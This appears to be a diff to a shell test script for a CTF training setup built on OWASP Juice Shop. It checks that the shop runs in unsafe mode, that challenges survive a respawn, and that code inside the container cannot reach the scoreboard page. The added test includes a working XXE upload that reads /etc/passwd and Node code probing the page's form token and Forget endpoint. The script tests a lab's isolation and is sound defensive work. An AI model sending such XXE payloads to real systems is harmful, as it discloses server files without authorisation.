@@ -9,10 +9,14 @@
 #   size        the image is Juice Shop's plus less than 20 MB
 #   users       keeper uid 0, ctf-node uid 10001 with NO capabilities, Juice
 #               Shop uid 65532
-#   isolation   as 65532 (code in Juice Shop): node.db cannot be read,
+#   unsafe      Juice Shop runs with its safety mode off: no challenge
+#               disabled, XXE solvable through the proxy, also after a respawn
+#   isolation   as 65532 (code in Juice Shop, which SSTi and RCE give for
+#               real with the safety mode off): node.db cannot be read,
 #               ctf-node and the keeper cannot be signalled; the webhook is
 #               not reachable from outside the container's loopback; the
-#               page's port is the keeper's, so 65532 cannot take it
+#               page's port is the keeper's, so 65532 cannot take it, and the
+#               page answers 65532 nothing (no form token, no Forget)
 #   respawn     killing Juice Shop from inside: the keeper starts it again and
 #               ctf-node puts the progress back
 #   refuse      without SETUID/SETGID the container does not start; ctf-node
@@ -59,6 +63,12 @@ healthy() { [ "$(docker inspect -f '{{.State.Health.Status}}' "$C")" = healthy ]
 is_shop() { local o; o="$(curl -s "$B/juiceshop/")"; grep -q '<title>OWASP Juice Shop' <<<"$o"; }
 page_has() { local o; o="$(curl -s "$P/ctf/")"; grep -qF -- "$1" <<<"$o"; }
 unsolved() { ! solved "$1"; }
+none_disabled() {
+    curl -s "$B/juiceshop/api/Challenges" | python3 -c '
+import json, sys
+d = json.load(sys.stdin)["data"]
+sys.exit(0 if len(d) > 100 and not any(c["disabledEnv"] for c in d) else 1)'
+}
 nothing_solved() {
     curl -s "$B/juiceshop/api/Challenges" | python3 -c '
 import json, sys
@@ -133,6 +143,19 @@ csrf="$(curl -s -c "$JAR" -b "$JAR" "$P/ctf/" | sed -n 's/.*name="csrf" value="\
 [ "$(status "$B/juiceshop/ftp/acquisitions.md")" = 200 ] || fail "solving"
 wait_for 20 "the page shows the solve" page_has '<span class="num">100</span>'
 
+step "unsafe mode: the challenges Juice Shop disables in Docker are on"
+none_disabled || fail "Juice Shop disables challenges: the keeper did not start it with NODE_ENV=unsafe"
+ok "Juice Shop reports no challenge disabled"
+# XXE through the proxy, as from Kali: answered only with the safety mode off.
+# The same upload solves Deprecated Interface (2★) and, as Juice Shop answers
+# it with an error, Error Handling (1★): 100 + 450 + 250 + 100 on the page.
+xml="$(mktemp)"
+printf '<?xml version="1.0"?>\n<!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<c>&x;</c>\n' >"$xml"
+curl -s -o /dev/null -F "file=@$xml;filename=complaint.xml;type=text/xml" "$B/juiceshop/file-upload"
+rm -f "$xml"
+wait_for 20 "XXE Data Access solved through the proxy" solved xxeFileDisclosureChallenge
+wait_for 20 "the page counts it" page_has '<span class="num">900</span>'
+
 step "isolation"
 result="$(as 65532 "
 const fs = require('fs'), net = require('net');
@@ -150,14 +173,31 @@ echo "   as 65532: $result"
 ip="$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$C")"
 from_outside="$(docker run --rm --network "$NET" curlimages/curl:8.10.1 -s -o /dev/null -w '%{http_code}' --max-time 5 -X POST "http://$ip:8081/webhook" || true)"
 [ "$from_outside" = 000 ] || fail "the webhook answers from outside the container ($from_outside)"
+# What SSTi would try: read the page's form token, or post Forget, from inside.
+page_from_inside="$(as 65532 "
+const http = require('http'), os = require('os');
+const hosts = ['127.0.0.1', ...Object.values(os.networkInterfaces()).flat().filter(i => i.family === 'IPv4' && !i.internal).map(i => i.address)];
+const out = []; let left = hosts.length * 2;
+const done = s => { out.push(s); if (--left === 0) console.log(out.sort().join(',')); };
+for (const h of hosts) for (const m of ['GET', 'POST']) {
+  const r = http.request({ host: h, port: 8080, method: m, path: m === 'GET' ? '/ctf/' : '/ctf/forget',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }, res => { res.resume(); done(m + ':' + res.statusCode); });
+  r.on('error', e => done(m + ':' + e.code)); r.end(m === 'POST' ? 'confirm=forget' : '');
+}")"
+echo "   as 65532 to the page: $page_from_inside"
+[ -n "$page_from_inside" ] && ! grep -qv '403' <<<"${page_from_inside//,/$'\n'}" || fail "the page answers code inside the container ($page_from_inside)"
+page_has "Image Test" || fail "the student was forgotten"
 [ "$(docker run --rm --network "$NET" curlimages/curl:8.10.1 -s -o /dev/null -w '%{http_code}' --max-time 5 "http://$ip:8080/ctf/")" = 200 ] || fail "port 8080 is not reachable from outside"
-ok "node.db unreadable, ctf-node and the keeper not signallable, the page's port not takeable, webhook on loopback only"
+ok "node.db unreadable, ctf-node and the keeper not signallable, the page's port not takeable nor answering 65532, webhook on loopback only"
 
 step "respawn: Juice Shop killed from inside"
 as 65532 "process.kill($JS_PID, 'SIGKILL')"
 wait_for 20 "Juice Shop is gone" unsolved directoryListingChallenge
 wait_for 60 "the keeper started it again and ctf-node restored the solve" solved directoryListingChallenge
 [ "$(docker inspect -f '{{.RestartCount}}' "$C")" = 0 ] || fail "the container restarted"
+none_disabled || fail "Juice Shop started again in its safe mode"
+solved xxeFileDisclosureChallenge || fail "XXE Data Access was not restored"
+ok "started again unsafe, XXE Data Access restored"
 
 step "Restart Juice Shop button"
 csrf="$(curl -s -c "$JAR" -b "$JAR" "$P/ctf/" | sed -n 's/.*name="csrf" value="\([0-9a-f]*\)".*/\1/p' | head -1)"
